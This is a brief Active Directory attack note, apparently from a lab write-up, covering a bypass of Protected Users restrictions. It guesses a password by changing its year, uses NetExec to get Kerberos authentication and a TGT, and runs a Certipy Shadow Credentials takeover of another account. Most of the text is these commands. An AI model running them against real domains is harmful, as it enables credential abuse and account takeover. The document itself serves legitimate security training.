# Protected Users Group Restriction bypass

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Since our user is a member of the Protected Users group, NTLM authentication cannot be used and delegation is not possible. Additionally, the password appears to be outdated (ending in 2025), so we try the 2026 variant. We then use the -k flag to authenticate via Kerberos instead.

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
nxc smb DC01.htb -u svc_recovery -p 'E2026' -k
```
{% endcode %}

We generate a Kerberos TGT for user using NetExec

{% code overflow="wrap" %}
```bash
nxc smb 9.22.xxx -u '<>' -p '<>' -d logging.htb -k --generate-tgt 'username'
export KRB5CCNAME=username.ccache
```
{% endcode %}

We perform a Shadow Credentials attack to take over the user white account

{% code overflow="wrap" %}
```bash
export KRB5CCNAME=username.ccache
certipy-ad shadow auto -u 'FRANK.EHRMANTRAUT@grandstay.local' -p 'Password@123' -dc-ip 192.168.178.187 -target DC01.grandstay.local -account TERENCE.WHITE -k
```
{% endcode %}
